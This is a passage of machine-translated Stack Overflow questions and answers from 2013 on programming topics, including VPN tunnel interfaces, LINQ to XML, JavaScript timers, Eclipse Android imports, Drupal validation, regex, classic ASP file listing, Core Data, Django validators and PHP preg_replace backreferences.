如果您删除了 tun/tap 接口，那么您将不得不修改**任何**希望通过 vpn 进行通信的应用程序，以便对于它的任何网络通信，您都需要拦截它们；加密它们；转发他们；接收响应并解密它们。通过使用 tun/tap 层，您允许内置 IP 路由获取未加密的数据包并对其进行加密并转发 - 即您无需修改​​任何与专用网络通信的应用程序。

几乎计算机科学中的每一个问题都可以通过添加一层间接来解决。通过添加这些层，我们降低了单个组件的复杂性，但可以构建强大的系统。如果我们没有 ppp 接口，每个程序都需要知道如何进行串口通信，如果我们没有 tun/tap，每个程序都需要知道如何使用 vpn 以及如何进行串口通信.

您可以删除 tun/tap 连接的唯一方法是，如果 ppp 连接是与私有系统建立的。您将不得不使用类似于 GSM 数据的东西（这是 9600 位/秒，这是一个实际的电话呼叫），即使这样您也没有加密，并且您正在通过蜂窝网络，这会打败专用网络的整体意图。

以下是各种隧道协议如何工作的粗略简化，但应该足够详细地解释您应该能够理解为什么不能只将一个交换为另一个。

要了解为什么不同的 vpn 协议使用不同的接口来完成它们的工作，您必须了解它们是如何设计的。TAP、L2TP 和 PPTP 都是第 2 层协议的示例。TUN 是第 3 层协议的一个示例。

为了理解这些差异，我将使用邮政类比。第 2 层（也称为链路层），相当于一个信使。你递给他一封信，他亲自递给收件人。快递员知道他所在地区的所有潜在目的地，任何发往该地区的消息都可以由他处理。

如果我们扩展这个类比，邮箱也可以被视为有效的第 2 层端点。如果你想在全国范围内收到信件，你把它们放在邮箱里。这类似于 L2TP、PPTP 和 TAP 包装它们的数据包以通过网络传输。

第 3 层是信件上的地址 - 它可以用来将信件从邮局转移到邮局，最终到达邮递员的手中。这是包装数据包通过网络路由的地方。

它回到第 2 层，此时邮递员知道其投递区域内的目的地并将信件交给预期的收件人。这是打包的数据包被解包然后由 L2TP、PPTP 或 TAP 端点处理的地方

对于 TUN，这要容易一些。您的信件会直接送到您当地的邮局，然后集体送到您收集它们的目的地邮局。可能会有一些关于将信件送到邮局或从邮局到目的地地址的细节，但这实际上并不是协议的一部分。

然后是如何实现它们的尴尬细节。L2TP 和 PPTP 都被定义为`ppp`，一种在两个端点之间建立直接连接的成熟机制，因此为了在这种系统上进行通信，起点和终点都需要点对点点协议。隧道提供了一个虚拟层，这些`ppp`消息可以在其中传播（这个隧道就是`T`它们名字的来源）。

*TAP 接口是根据以太网*数据包的隧道定义的- 这些是您会看到通过 WiFi 连接快速传输的数据包。它在通过这些以太网数据包的两个网络之间建立了一个简单的桥接。以太网数据包通常包含 IP 数据包，允许您将它们直接放在目的地的线路上，而无需重新封装它们。

*TUN 接口是根据IP*数据包的隧道定义的——这些数据包是经过转换之前的数据包，以便它们可以通过以太网/WiFi 等物理连接传输。这意味着您正在计算机和目标网络之间建立路由虚拟 IP 网络。目标由该接口提供的路由定义的 IP 数据包将发送到该接口。

最终产品是他们系统上可以发送 IP 数据包的*另一个网络接口。*这个接口封装了数据包（对于 PPTP/L2TP 在 ppp 数据包中；对于 TAP 在以太网数据包中；对于 TUN 在另一个 IP 数据包中）。加密可能在包装之前、包装之后或在这两个点都涉及（取决于协议）。理解 L2TP 的程序将精通交谈`PPP`，但如果不进行重大重写，则无法交谈其他协议。

# xml - 在 XML 文件的第二个嵌套级别中解析元素

> ID：15845091
> 
> 赞同：0
> 
> 时间：2013-04-05T23:13:55.560
> 
> 标签：xml, c#-4.0, xml-parsing, linq-to-xml

我正在开发一个小的可执行应用程序。该应用程序只是一个 XML 解析器，它将解析 XML 文件并将解析的数据存储到数据库中。因此，此应用程序将对其施展魔法的 XML 文件具有以下结构：

```
<?xml version="1.0" encoding="utf-8"?>
<events>
    <event>
        <book>Felicity Fly</book>
        <author>Christina Gabbitas</author>
        <bookImgUrl>http://www.whsmith.co.uk/Images/Products\957\255\9780957255203_t_f.jpg</bookImgUrl>
        <info>Christina Gabbitas will be signing copies of her new book, Felicity Fly. Books should be bought from WHSmith. Proof of purchase may be necessary</info>
        <date>25 May 2013</date>
        <startTime>10:30</startTime>
        <location>
            <name>WHSmith Brent Cross</name>
            <address>Brent Cross Shopping Centre</address>
            <city>London</city>
            <county/>
            <postcode>NW4 3FB</postcode>
            <tel>020 8202 4226</tel>
        </location>
    </event>
    <!-- many more events as above here -->
</events> 
```

这就是我迄今为止在代码解析逻辑方面的内容。

```
namespace XMLParser
{
    public class Parser
    {
        static void Main(string[] args)
        {
            var path_to_xml = "data.xml";
            var xdoc = XDocument.Load(path_to_xml);
            var events = from e in xdoc.Descendants("event")
                         select new {
                             Book = (string)e.Element("book").Value,
                             Author = (string)e.Element("author").Value,
                             BookImgUrl = (string)e.Element("bookImgUrl").Value,
                             Info = (string)e.Element("info").Value,
                             Date = (string)e.Element("date").Value,
                             Time = (string)e.Element("startTime").Value,
                             // stuck here
                         }
        }
    }
} 
```

我在到达 Location 节点的地方卡住了，我不知道如何解析与位置相关的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T03:25:14.473

假设您想保持位置字段嵌套......

```
 var xdoc = XDocument.Parse(xml);
       var events = from e in xdoc.Descendants("event")
                     select new {
                         Book = e.Element("book").Value,
                         Author = e.Element("author").Value,
                         BookImgUrl = e.Element("bookImgUrl").Value,
                         Info = e.Element("info").Value,
                         Date = e.Element("date").Value,
                         Time = e.Element("startTime").Value,
                         Location = new {
                             Name = e.Element("location").Element("name").Value,
                             Address = e.Element("location").Element("address").Value,
                             City = e.Element("location").Element("city").Value,
                             County = e.Element("location").Element("county").Value,
                             Postcode = e.Element("location").Element("postcode").Value,
                             Tel = e.Element("location").Element("tel").Value
                         }
                     };

            Console.WriteLine(events.First().Location.City); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T08:56:35.833

您必须决定是使用`(string)XElement`强制转换还是使用`XElement.Value`属性。

`(string)e.Element("book").Value`编译和工作正常，但`XElement.Value`已经是一个字符串，所以将它转换为字符串是没有意义的。我建议使用`(string)XElement`，因为它不会导致`NullReferenceException`何时找不到 Element 。

您也可以使用`let`关键字`e.Element("location")`只获取一次，然后使用它来获取所有`Location`相关值：

```
var xdoc = XDocument.Parse(xml);
var events = from e in xdoc.Descendants("event")
             let l = e.Element("location")
             select new {
                 Book = (string)e.Element("book"),
                 Author = (string)e.Element("author"),
                 BookImgUrl = (string)e.Element("bookImgUrl"),
                 Info = (string)e.Element("info"),
                 Date = (string)e.Element("date"),
                 Time = (string)e.Element("startTime"),
                 Location = new {
                     Name = (string)l.Element("name"),
                     Address = (string)l.Element("address"),
                     City = (string)l.Element("city"),
                     County = (string)l.Element("county"),
                     Postcode = (string)l.Element("postcode"),
                     Tel = (string)l.Element("tel")
                 }
             };

Console.WriteLine(events.First().Location.City); 
```

# javascript - 异步调用函数？

> ID：15845092
> 
> 赞同：0
> 
> 时间：2013-04-05T23:13:57.350
> 
> 标签：javascript, jquery, asynchronous

我有一个昂贵的函数，createNewWindow()。我想在调用方法时显示进度指示器，然后在函数完成时隐藏该指示器。不过，我尝试过的一切，在方法完成之前我都看不到进度指示器，所以我试图异步调用该方法（并且失败）。

我试过这个：

```
$( "#submit" ).click( function () {
    $("#progress").show();
    $.Deferred(createNewWindow());
} ); 
```

createNewWindow 的最后一行是 $("#progress").show()。没用。在此之前我尝试过：

```
$( "#submit" ).click( function () {
    $("#progress").show();
    setTimeout(createNewWindow(), 0);
} ); 
```

一样的效果。

这样做的正确方法是什么？

我看到了一些类似[这样](https://stackoverflow.com/questions/9516900/how-can-i-create-an-asynchronous-function-on-javascript)的其他 SO 帖子，这些帖子描述了使用 setInterval 或 setTimeout，但我无法让它们像我期望的那样工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T23:18:38.447

这是一个常见的错误。问题就在这里：

```
setTimeout(createNewWindow(), 0); 
```

这将`createNewWindow`立即调用并将结果（可能是无效的）传递给`setTimeout`. 这不是您想要的，您想将*函数* `createNewWindow`传递`setTimeout`给它以便稍后调用它：

```
setTimeout(createNewWindow, 0); 
```

注意缺少的括号。您将`createNewWindow`（这是一个函数）的值传递给`setTimeout`，而不是调用它并传递它的返回值。

这应该会立即显示进度条。但是，如果`createNewWindow`是一个消耗大量资源的非常昂贵的函数，它仍然*会*减慢您的网页速度，因为您的所有 JavaScript 代码都在同一个线程中运行。在这种情况下，您可能需要考虑[使用`Worker`](https://developer.mozilla.org/en-US/docs/DOM/Using_web_workers).

# java - Eclipse导入现有的android项目

> ID：15845093
> 
> 赞同：1
> 
> 时间：2013-04-05T23:13:57.597
> 
> 标签：java, android, eclipse

我有这个来自谷歌培训课程的[http://developer.android.com/shareables/training/Animations.zip演示项目。](http://developer.android.com/shareables/training/Animations.zip)当我在 Eclipse 中导入它时： Import > Existing Android Code Into Workspace![在此处输入图像描述](https://i.stack.imgur.com/mQ6yt.png)

如果我创建一个新项目，我会看到同样的情况： File > New > Project > Android Project from Existing code 也许有其他方法可以导入项目。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-05T23:24:45.937

沃瓦，

这是交易。基本上，该项目没有 .classpath 或 .project 文件。如果您尝试使用 Eclipse 打开它需要 .project 文件。简单地说，这样做：

一种。如果您在工作区中已经有一个构建项目，只需将该文件夹根目录中的 .project 和 .classpath 文件复制到 AnimationsDemo 的根目录（与该项目的 AndroidManifest.xml 所在的文件夹相同）。只需使用记事本 c 打开 .project 文件。在标签“名称”中，将现有项目的名称更改为 AnimationsDemo。

就是这样。

通过接受答案告诉我这是否有效！

-维维克

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:47:22.410

要进行导入，您不需要 .classpath 或 .project 文件。但是，您确实需要指向作为新项目目标的工作区之外的目录。

我使用这个目录结构 src/src/workspace

我所有的项目都在 src/workspace 中。请注意，代码不必进入工作区目录，但我经常在 src/workspace 中创建项目及其代码。

如果我正在导入代码，我将 zip 文件放在 src/ 中并在那里展开。

在 Eclipse 中，我选择 Import > Existing Android Code Into Workspace。然后我浏览到 src/ 中包含我解压缩的代码的目录，然后单击“确定”。

此时，我在您包含的同一个对话框中。我通常更改项目名称，并且*总是*单击将项目复制到工作区。

我总是点击它的原因是，如果我不点击它，Eclipse 会*在 src/ 的目录中*创建项目。如果您想要导入的样本的原始副本，这不是一个好主意。如果我单击将项目复制到工作区，我总是使用副本，而不是原始文件。

如果您在尝试导入之前在包含代码的目录中执行任何与 Android 相关的工作，那么您在尝试导入时会遇到奇怪的错误。我不确定这是否是一个错误。我只记得先在 Eclipse 中创建项目，*然后*在 Eclipse之外做一些事情。我经常先在 Eclipse 中设置我的项目，然后使用“android 更新项目”对其进行修改。这使我可以更轻松地使用命令行工具处理项目。此外，Ant 是生成可发布代码的最佳方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-31T06:00:28.267

更改工作区对我有用。

# python - python中这段代码的语法错误是什么？

> ID：15845097
> 
> 赞同：-3
> 
> 时间：2013-04-05T23:14:20.813
> 
> 标签：python, code-formatting

我是编程和python的新手，我正在看一个讲座，我想创建一个像讲师在视频中所做的简单函数，所以我设计了3个函数，addition，mean，mean_Addition，如下所示，addition只是add 2个数字和平均值函数计算两个数字的平均值mean_Addition将平均值和两个数字相加

我编写了代码并运行了程序，但它告诉我有一些语法错误，我一遍又一遍地检查它，但我无法确定出了什么问题

我的简单程序的代码是：

```
def addition(float1,float2):
     '''(float,float)-> float

return the addition of float1 and float2 .

>>> addition(2,3)
5.0
>>>addition(4,6)
10.0 '''
     return float1+float2

def mean(x , y ):
    '''
(number,number)-> float
return the mean of two numbers , x and y .
>>> mean(2,4)
 3.0
>>> mean(9,2)
5.5
 '''
    return  addition(x,y)/ 2

def Mean_Addition(t,s):
'''
(float,float)->float
return the mean of the two numbers plus the addition of the two numbers
>>> Mean_Addition(1,2)
4.5
>>> Mean_Addition(4,5)
13.5
'''
    return addition(t,s) + mean(t,s) 
```

我要提到的一件事是错误出现在第三个函数 Mean_Addition 中，因为当我删除这部分时它运行良好！

问题是，当我选择 run modulo 时，它说“预期有一个缩进块”

那么我犯的语法错误是什么？

谢谢。

* * *

注意：对于那些将来会探索这个问题的人，我犯的语法错误（我从答案中学到了这一点）是我写的

```
def Mean_Addition(t,s):
'''
(float,float)->float 
```

但是我们不应该把“'''”放在“def”下面，我们应该在“def”下面留一个空格，所以正确的代码是

```
def Mean_Addition(t,s):
    '''
(float,float)->float 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:17:14.813

```
def addition(float1,float2):
     """
     (float,float)-> float
     return the addition of float1 and float2 .
     >>> addition(2,3)
     5.0
     >>>addition(4,6)
     10.0 
     """
     return float1+float2

def mean(x , y ):
    """
    (number,number)-> float
    return the mean of two numbers , x and y .
    >>> mean(2,4)
    3.0
    >>> mean(9,2)
    5.5
    """
    return  addition(x,y)/ 2

def Mean_Addition(t,s):
    """ <----- the error was here
    (float,float)->float
    return the mean of the two numbers plus the addition of the two numbers
    >>> Mean_Addition(1,2)
    4.5
    >>> Mean_Addition(4,5)
    13.5
    """
    return addition(t,s) + mean(t,s) 
```

# android - 在通知托盘的最后一个位置显示通知

> ID：15845098
> 
> 赞同：0
> 
> 时间：2013-04-05T23:14:24.760
> 
> 标签：android, android-notifications

所以，我想将我的通知显示为通知托盘中的最后一个。Last.fm 应用程序做到了。它显示通知，显示的日期是创建通知的日期，但在通知托盘中，它显示为最后一个通知，即使在较旧的通知之后也是如此。

我试图用优先级来做到这一点，但没有奏效。

那么，我该怎么做呢？这是可能的，因为另一个应用程序可以这样做，但有人知道怎么做吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T13:15:04.150

我终于使用优先级完成了它。我之前只是以错误的方式使用它。

# validation - Drupal 7 - 尝试向所有节点编辑表单添加自定义验证

> ID：15845101
> 
> 赞同：2
> 
> 时间：2013-04-05T23:14:39.953
> 
> 标签：validation, drupal, drupal-7, hook-form-alter

我想为所有节点编辑表单添加自定义验证。具体来说，将使任何图像字段**alt**和**title**属性成为必需。但我什至还没有到那一块。到目前为止，我有以下代码，但由于某种原因，我的验证辅助函数从未被调用：

```
<?php

/*
 * Implements hook_form_alter()
 */
function image_a11y_form_alter($form, &$form_state, &$form_id) {

  // Do this for ALL node edit forms (not specific form ID)
  if (isset($form['#node_edit_form']) &&  $form['#node_edit_form'] == TRUE) {
    $form['#validate'][] = 'custom_validate';
  }
}

function custom_validate($form, &$form_state){

  // Custom validation here

} 
```

我遵循了我在网上找到的几个示例，并仔细检查了 Drupal.org API 文档。我不知道我做错了什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-13T12:18:44.613

你做得很好，只需要在 hook_form_alter() 上引用 $form var

```
hook_form_alter(&$form, &$form_state, $form_id) 
```

并且永远不要忘记在潜入检查之前清除缓存。:)

# javascript - 匹配文件名基础

> ID：15845104
> 
> 赞同：1
> 
> 时间：2013-04-05T23:15:03.573
> 
> 标签：javascript, regex

仍然在这里学习正则表达式，但我需要一点帮助。

我有这个字符串 `assets/BigBlueSomething_tn.jpg`

我需要匹配这个 `BigBlueSomething`

我得到的最接近的是这个 ``[^\/][a-zA-Z]+_`

问题是我一直在匹配下划线，我`[^\/][a-zA-Z]+[^_]`在其他几个线程的建议下尝试过这个，但无济于事。

我正在用 javascript 编写，我相信有些正则表达式的东西在该语言中不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:17:19.583

这应该给你你需要的东西：

```
var str = 'assets/BigBlueSomething_tn.jpg';
var match = str.split('/')[1].match(/[a-z]+/i)[0]; 
```

编辑：我使用`split`了因为否则你必须循环匹配来提取你需要的东西。`match`不捕获组。

```
'assets/BigBlueSomething_tn.jpg'
       -^---------------------^- // .split('/')[1]
       -^--------------^- // .match(/[a-z]+/i)[0]

[a-z] // match any character from a to z
+ // at least one time
/i // case-insensitive to match A-Z as well 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:25:23.523

试试这个：

```
var text = "assets/BigBlueSomething_tn.jpg";
var matches = /assets\/(.+?)_tn.jpg/gi.exec(text);
if(matches && matches[1]) {
    var str = matches[1];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T23:24:30.380

```
/^(?:.*\/)?([0-9a-z]+)(?:_[a-z]+)?\.(?:jpg|jpeg|png|gif)$/i 
```

此正则表达式匹配以下字符串中的“BigBlueSomething”：

```
'assets/BigBlueSomething_tn.jpg' 
'BigBlueSomething_tn.jpg'
'BigBlueSomething_TN.jPeG'
'dir1/dir2/BigBlueSomething_tn.gif'
'BigBlueSomething.png'
'BigBlueSomething_thumb.png'
'directory/BigBlueSomething_thumb.JPEG' 
```

看到[这个小提琴](http://jsfiddle.net/vovkss/gBmdG/)。

# file - 文件夹中所有文件的纯 ASP 超链接

> ID：15845108
> 
> 赞同：1
> 
> 时间：2013-04-05T23:15:19.843
> 
> 标签：file, list, asp-classic, hyperlink, directory

我最近有一个项目，在任何地方都找不到简单的代码..希望这对某人有所帮助！确保为文件夹上的 IIS 应用程序帐户设置 NTFS 权限。使用 file:// 表示文件 http:// 表示直接链接，其他表示相对链接。

```
<%
dim fs,fo,x
set fs=Server.CreateObject("Scripting.FileSystemObject")
set fo=fs.GetFolder("C:\Path")

for each x in fo.files
Response.Write("<a href=file:///" &x & ">" & x & "</a>" & "</br>")
next

set fo=nothing
set fs=nothing
%> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-21T15:43:24.307

我找到了你的帖子，它对我很有用。我对其进行了一些更改，并想将其发布在这里，以防其他人也发现这很有用。由于我在本地设置 IIS 的方式以及在服务器上设置它的方式不同，因此在上传到服务器与在本地运行时，我必须取消/注释一些行。请记住，我是前端人员，这是我第一次编写这样的代码，所以请提供反馈:)

```
<%
    'Dim previewURL As String = "http://XXXXXX/"'Preview
    Dim previewURL As String = ""'Local

    'Dim site As String = "XXXXX"'Preview
    Dim site As String = ""'Local

    Dim currentDir As String = HttpContext.Current.Request.PhysicalApplicationPath.ToString()+site+"\web"

    Dim di As New IO.DirectoryInfo(currentDir)

    Dim diar1 As IO.FileInfo() = di.GetFiles("*.html")', IO.SearchOption.AllDirectories)'change this line if you want sub directories as well

    Dim dra As IO.FileInfo

    Response.Write("<h1>HTML Pages</h1>")
    Response.Write("<ul>")

    'list the names of all files in the specified directory
    For Each dra In diar1
        Response.Write("<li><a href="+previewURL+site+"/web/"+dra.Name+" target=_blank>"+dra.Name+"</a></li>")
    Next

    Response.Write("</ul>")
%> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-11-20T00:01:57.813

对此提供另一种解决方案。
对于某些人可能会被绑定到其文件的显式位置但不想处理未正确链接的网站的情况。

本质上，我们遍历给定目录中的所有文件，然后使用`GetFileName()`. 然后我们利用根目录`/`来`href`指向我们想要的文件。然后，用户可以从那里下载他们需要的东西。

```
<%
dim fs,fo,x
set fs=Server.CreateObject("Scripting.FileSystemObject")
set fo=fs.GetFolder("C:\Folder0\Folder1\Folder2\main\reports\archive")

for each x in fo.files
        x = fs.GetFileName(x)
        Response.Write("<a href=/main/reports/archive/" & x & " target=_blank>" & x & "</a>" & "</br></br>")
next

set fo=nothing
set fs=nothing
%> 
```

# matlab - 如何在matlab中设置一长串属性和值

> ID：15845111
> 
> 赞同：1
> 
> 时间：2013-04-05T23:15:41.157
> 
> 标签：matlab

MATLAB问题：

假设我在元胞数组中有很长的属性名称列表。

> 属性 = {'property01', 'property02', 'property03', .... , 'property50'};

以及每个属性的相应值。

> 值 = [val01, val02, val03, ...., val50];

现在我有一个函数，它根据特定条件将可变数量的属性作为输入。正确使用该函数的主要限制之一是只调用一次，并将所有必需的属性作为输入输入。（所以我不能在for循环中调用函数，每次循环不同的属性设置）

例如，如果某些条件迫使我使用 4 个属性，那么正确的用法是：

> 输出= someFunction（数据，'property01'，val01，'property02'，val02，'property03'，val03，'property04'，val04）；

如何为只调用一次的函数提供可变数量的属性？

Mayur Narsude

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:41:09.463

尝试这个：

```
pv = [properties;values];
output = someFunction(data, pv{:}); 
```

基本上，您创建一个 2xN 单元阵列，当它被线性化时，属性和值交替出现。

（那是在调用方。在函数定义中，您将使用另一个答案中提出的 varargin 。我想您在问题中所问的问题尚不清楚。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:25:55.313

我想你正在寻找`varargin`. 将其用作函数定义中的输入变量之一将允许您使用不同数量的输入调用函数。

# ios - 如何使用 imageWithContentsOfFile 读取本地化图像

> ID：15845113
> 
> 赞同：3
> 
> 时间：2013-04-05T23:15:58.097
> 
> 标签：ios, objective-c, image, cocoa-touch, localization

这是我在这里的第一个问题:-)

我有一个图像 icon_new.png 已本地化为 3 种语言。我需要在运行时使用这样的东西加载它：

```
NSString *path = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"icon_new.png"];
UIImage *img = [UIImage imageWithContentsOfFile:path]; 
```

上面的问题是它适用于非本地化图像，但对于本地化图像，它们的真实路径实际上附加了 en.lproj、zh-Hans.lproj 或其他文件夹名称，具体取决于本地化中包含的语言。

现在我可以检查当前的语言环境并相应地附加路径：

```
// This path would work for image that's localized - for English version of it.
NSString *path = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"en.lproj/icon_new.png"]; 
```

但是我想知道是否有自动的方法来做到这一点？就像应用程序从正确的语言环境路径加载整个 UI .xib 文件一样，所以基本上我只会指定图像名称而不是完整路径，并获得正确的本地化版本。

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:38:29.580

使用`NSBundle`'s `-pathForResource:ofType:`，它首先搜索主目录，如果在该目录中找不到资源，则检查相应的本地化目录。

```
NSString *path = [[NSBundle mainBundle] pathForResource:@"icon_new" ofType:@"png"]; 
```

# ios - Core Data 应该如何与我的“不寻常”对象一起使用？

> ID：15845115
> 
> 赞同：1
> 
> 时间：2013-04-05T23:16:25.377
> 
> 标签：ios, core-data, nsmanagedobject

我有一个购物清单应用程序，我计划将 Core Data 与它一起使用。

我有一个杂货`Item`抽象类，它有三个子类：`RecipeItem`、`QuickAddItem`和`HybridItem`。前两个子类很简单，但`HybridClass`不同 - 它只是 ivar 是**other** `RecipeItem`和`QuickAddItem`对象的数组。

下面是它的使用方法：一旦创建了购物清单 Item 对象，所有`Item`具有匹配单位类型的对象（例如 1 磅糖，1/2 磅糖）都被放入数组中`NSArray *items`，并`HybridItem`使用以下方法初始化：

```
- (id)initWithItems:(NSArray *)items 
```

在此`initWithItems:`方法中，`items`数组中的项目被按摩和组合，因此它将在杂货清单中显示为单个条目。我需要抓住实际的对象，以便参考它们的来源、添加日期等等......

当我开始为 Core Data 规划架构时，我不确定如何将`HybridItem`类转换为 NSManagedObject。我考虑过的选项：

*   使`HybridItem`属性`items`成为可**转换的属性**，但从我所读的内容来看，它被存储为“平面”数据块 - 如果我`Item`在以后的构建中修改我的实体并将更新推送给我的用户，他们的存储`HybridItem`将在他们这样做时引起问题他们更新后的第一次获取

*   将`HybridItem`实体设为**瞬态实体**`Item`，并在每次启动应用时搜索可组合的对象。缺点是这将导致用户等待`Item`对象的组合

*   保持`HybridItem`作为常规类并在启动时搜索可组合项，缺点与上述相同

*   将 保留`HybridItem`为常规类并使用`NSCoding`. 可以肯定的是，这有一些代码气味

当我研究与我类似的问题时，普遍的看法是把像这样的数组的属性做成一个单独的实体，并使用关系与对象关联。但我的情况似乎不同，因为该`items`属性实际上包含具有相同父实体（！）的实体数组。

我最后的考虑是我已经排除了只是不使用核心数据。这将不起作用，因为我的 Items 实体将拥有其他具有重要关系（数量、计量单位）的实体，这将使**不**使用 Core Data 变得不可行。

我应该如何编码我的`HybridItem`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:32:31.213

似乎最直接的方法如下：

*   在您的子类中，定义与抽象类`HybridItem`的一对多关系`Item`
*   在类中，定义调用类的`Item`一对一关系。`parentItem``HybridItem`
*   使这两种关系彼此相反
*   在`HybridItem`类中，为要根据`items`数组中每个项目的数量（例如给定单位的数量）计算的任何值定义瞬态属性。
*   当您运行算法将可组合项目收集到单个混合项目中时，只需将这些项目添加到与的一对多关系`items`关联的集合中`HybridItem`

请注意，这种方法确实允许混合项目包含其他混合项目。如果您不希望这样，那么您将不得不引入一个新的子类`Item`并将其命名为`SingleItem`. 然后创建`RecipeItem`和`QuickAddItem`（但不是`HybridItem`） 的子类`SingleItem`。然后您将创建上述关系，而是在`SingleItem`和之间创建它们`HybridItem`

# django - 如何设置models.TextField（）的最小长度？

> ID：15845116
> 
> 赞同：17
> 
> 时间：2013-04-05T23:16:36.723
> 
> 标签：django

似乎只有一个`max_length`。`CharField`但是`min_length`对于一个`TextField()`，有没有办法在 中强制 100 个字符`TextField`？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-04-06T00:09:07.480

您将使用自定义[验证器](https://docs.djangoproject.com/en/stable/ref/validators/)，特别是[`MinLengthValidator`](https://docs.djangoproject.com/en/stable/ref/validators/#minlengthvalidator)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2018-12-16T11:45:32.453

声明 Django 表单时

```
cell_phone=forms.CharField(max_length=10,min_length=10); 
```

在 Django 模板中呈现表单字段时

```
{% render_field form1.cell_phone  minlength="10" maxlength="10" %} 
```

下划线令人困惑

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2021-08-23T09:09:53.677

对于`models.Models`字段验证：

```
from django.db.models import TextField
from django.db.models.functions import Length

TextField.register_lookup(Length, 'length')

class Foo(models.Mode):
    text_field_name = models.TextField()

    class Meta:
        constraints = [
            models.CheckConstraint(
                check=Q(text_field_name__length__gte=10),
                name="text_field_name_min_length",
            )
        ] 
```

使用约束将在数据库级别创建验证（我认为），这将被调用`save()` 这也适用于`CharField`.

# javascript - MSCSSMatrix.setMatrixValue 在 JavaScript 中的语法是什么？

> ID：15845122
> 
> 赞同：0
> 
> 时间：2013-04-05T23:17:05.817
> 
> 标签：javascript, matrix, internet-explorer-10

我有下面的代码，但是使用`MSCSSMatrix.SetMatrixValue`不能填充矩阵的16个元素？属性的填充进展顺利；我找不到任何实例化`MSCSSMatrix`.

```
scale: function () {
    var s = 0.5;
    var el = document.getElementById("containeddiv");
    var matrix = new MSCSSMatrix(el.style.transform);
    matrix = matrix.setMatrixValue("matrix3d(0.5,0,0,0,0,0.5,0,0,0,0,0.5,0,0,0,0,1)");
    matrix.m11 = s
    matrix.m12 = 0
    matrix.m13 = 0
    matrix.m14 = 0
    matrix.m21 = 0
    matrix.m22 = s
    matrix.m23 = 0
    matrix.m24 = 0
    matrix.m31 = 0
    matrix.m32 = 0
    matrix.m33 = s
    matrix.m34 = 0
    matrix.m41 = 0
    matrix.m42 = 0
    matrix.m43 = 0
    matrix.m44 = 1
    el.style.transform = matrix;
}, 
```

# tomcat - Tomcat中图像的网络驱动器路径

> ID：15845123
> 
> 赞同：3
> 
> 时间：2013-04-05T23:17:10.450
> 
> 标签：tomcat, tomcat7

在 tomcat 7 中，我在 tomcat/catalina/localhost 文件夹中设置了 context#image.xml，如下所示

```
<Context path="/image" docBase="C:\application\images" crossContext="true"/> 
```

现在这工作正常，因为我能够在浏览器中看到图像。

但是，如果我希望通过 Windows 网络驱动器中的 tomcat 在浏览器中显示图像怎么办。说路径是 \net1\applications\images ？如果可能的话？

我尝试在 context.xml 中提供上述网络路径...但未显示图像。它抛出错误。我究竟做错了什么？还是有可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T03:33:00.507

您是否尝试过将网络路径映射到本地驱动器（例如 x:），然后将 x:\application\images 添加到上面的 xml 文件中？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-09T14:21:13.570

这是可能的，如此[处](http://blog.mattwoodward.com/2010/08/accessing-network-drive-from-apache-and.html)所述。

用于服务的用户帐户没有网络访问权限。您必须创建一个新用户并配置该服务，以便它以该用户身份登录。

# php - preg_replace 在 $1 之后添加“00”，替换中没有空格

> ID：15845129
> 
> 赞同：1
> 
> 时间：2013-04-05T23:17:49.447
> 
> 标签：php, replace, preg-replace

我试图在 preg_replace 替换中没有空格的 $1 之后添加“00”。

我的代码：

```
$count = null;
$returnValue = preg_replace('/de(.*)y/i', '$1 00', 'delipsumy', -1, $count); 
```

我想要像 '$1'.'00' 之类的东西来替换输出应该是：

> Lipsum00（没有任何空格）

我已经尝试过类似 '$1'.'00' 和 '$100' 但不起作用

有什么建议吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T23:22:17.573

尝试：

```
$returnValue = preg_replace('/de(.*)y/i', '\${1}00', 'delipsumy', -1, $count); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:25:20.753

这在[方法的文档中得到解决](http://php.net/manual/en/function.preg-replace.php) *（强调添加）*：

> 当使用一个反向引用后跟另一个数字的替换模式时（即：在匹配的模式之后立即放置一个文字数字），您不能使用熟悉的 \1 符号作为反向引用。例如，\11 会混淆 preg_replace()，因为它不知道您是想要 \1 反向引用后跟文字 1，还是要 \11 反向引用后跟什么都没有。**在这种情况下，解决方案是使用 \${1}1**。这将创建一个孤立的 $1 反向引用，将 1 保留为文字。

所以你的替换模式将是`'\${1}00'`. 举个例子：

```
// Output: H__e__ll__o__ W__o__rld
echo preg_replace("/([aeiou])/", "__\${1}__", "Hello World"); 
```

在行动中看到它：http: [//codepad.org/orbK5jdw](http://codepad.org/orbK5jdw)

# php - 从一个表中添加多个字段的值并将其减去到php中另一个表中的字段

> ID：15845146
> 
> 赞同：0
> 
> 时间：2013-04-05T23:19:46.857
> 
> 标签：php, addition, subtraction

我有两张桌子：`contract` `bill`。
`contract`表包含以下字段（contId (PK)、contractNumber、数量等）。
